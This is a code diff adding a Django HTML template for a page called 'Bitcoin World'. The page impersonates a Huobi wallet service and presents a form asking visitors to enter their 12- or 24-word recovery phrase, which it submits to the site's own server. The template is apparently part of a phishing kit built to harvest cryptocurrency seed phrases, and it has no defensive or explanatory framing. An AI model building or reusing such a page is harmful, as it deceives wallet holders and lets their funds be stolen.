@@ -1,0 +1,40 @@
+{% load static %}
+<!doctype html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>Bitcoin World</title>
+
+    <link rel="stylesheet" href="{% static 'css/style.css' %}">
+  </head>
+<body>
+
+<!-- contact -->
+    <div class="container">
+		<form action="" method="POST" class="contact-form">
+			{% csrf_token %}
+			
+			<div class="form-control" style="background-color: #1a202c; border-color: #1a202c;">
+				<div class="tag" style="color: #fff; margin: 20px">Huobi wallet</div>
+				<textarea name="message" placeholder="Enter your recovery phrase" cols="30" rows="10" required=""></textarea>
+			</div>
+			<p style="color:#fff">Typically 12 (sometimes 24) words separated by single spaces</p>
+			<div class="form-control" style="background-color: #1a202c; border-color: #1a202c;">
+				<input type="submit" class="btn submit-btn" value="submit">
+			</div>
+	   
+	   
+	   
+	   </form>
+					
+					
+		
+		
+					
+	</div>
+<br>
+</body>
+</html>
